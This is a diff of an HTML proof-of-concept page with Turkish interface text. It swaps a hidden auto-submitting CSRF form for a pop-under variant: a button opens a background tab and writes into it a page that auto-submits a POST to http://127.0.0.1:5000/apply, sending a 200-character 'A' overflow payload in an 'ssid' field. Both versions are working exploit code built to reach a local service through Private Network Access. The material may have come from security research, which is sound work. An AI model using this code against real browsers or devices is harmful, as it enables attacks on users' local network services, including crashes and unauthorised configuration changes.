@@ -2,28 +2,40 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Top-Level Navigation Exploit</title>
+  <title>Pop-under Test Sayfası</title>
 </head>
 <body>
-  <h2>Sayfa Yükleniyor...</h2>
-
-  <form id="csrfForm" 
-        action="http://127.0.0.1:5000/apply" 
-        method="POST" 
-        target="_top" 
-        style="display:none;">
-    <input type="hidden" name="ssid" id="payload">
-  </form>
+  <h2>Test</h2>
+  <p>Tarayıcının davranışını test etmek için butona tıkla.</p>
+  
+  <button id="triggerBtn">Arkaplan</button>
 
   <script>
-    // overflow example
-    var payload = "A".repeat(200);
-    document.getElementById("payload").value = payload;
+    document.getElementById('triggerBtn').addEventListener('click', function() {
+      var newTab = window.open('about:blank', '_blank');
 
-    // form submit
-    window.onload = function() {
-      document.getElementById("csrfForm").submit();
-    };
+      window.focus();
+
+      var payload = "A".repeat(200);
+      var exploitCode = `
+        <!DOCTYPE html>
+        <html>
+        <head><title>İşlem Yapılıyor...</title></head>
+        <body>
+          <h3>PNA İsteği Gönderiliyor...</h3>
+          <form id="csrfForm" action="http://127.0.0.1:5000/apply" method="POST">
+            <input type="hidden" name="ssid" value="${payload}">
+          </form>
+          <script>
+            document.getElementById("csrfForm").submit();
+          <\/script>
+        </body>
+        </html>
+      `;
+      
+      newTab.document.write(exploitCode);
+      newTab.document.close();
+    });
   </script>
 </body>
 </html>
